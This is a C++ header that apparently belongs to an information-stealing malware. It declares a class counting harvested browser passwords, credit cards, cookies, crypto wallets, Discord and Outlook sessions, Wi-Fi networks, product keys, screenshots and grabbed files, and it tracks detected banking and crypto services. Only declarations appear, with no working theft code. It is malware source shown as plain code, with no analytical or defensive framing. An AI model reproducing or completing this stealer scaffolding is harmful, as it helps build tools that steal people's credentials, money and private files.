#pragma once
#include <vector>
#include <string>
class Counter
{
public:

	//Browsers
	static int Passwords;
	static int CreditCards;
	static int AutoFill;
	static int Cookies;
	static int History;
	static int Bookmarks;
	static int Downloads;

	//Applications
	static int Vpn;
	static int Pidgin;
	static int Wallets;
	static int BrowserWallets;
	static int FtpHosts;

	//Sessions ,tokens

	static bool Discord;
	static bool Outlook;


	//System Data
	static int SavedWifiNetworks;
	static bool ProductKey;
	static bool DesktopScreenshot;

	//Grabber stats
	static int GrabberImages;
	static int GrabberDocuments;
	static int GrabberDatabases;
	static int GrabberSourceCodes;

	//Banking & Cryptocurrency services detection
	static  bool BankingServices;
	static  bool CryptoServices;
public:

	static  std::vector<std::string> DetectedBankingServices;
	static  std::vector<std::string> DetectedCryptoServices;

public:

	static std::string getBValue(bool value, const std::string& success, const std::string& failed);
	static std::string getSValue(const std::string& application, bool value);
	static std::string getIValue(const std::string& application, int value);
	static std::string getLValue(std::string application, std::vector<std::string> value, char separator);

};

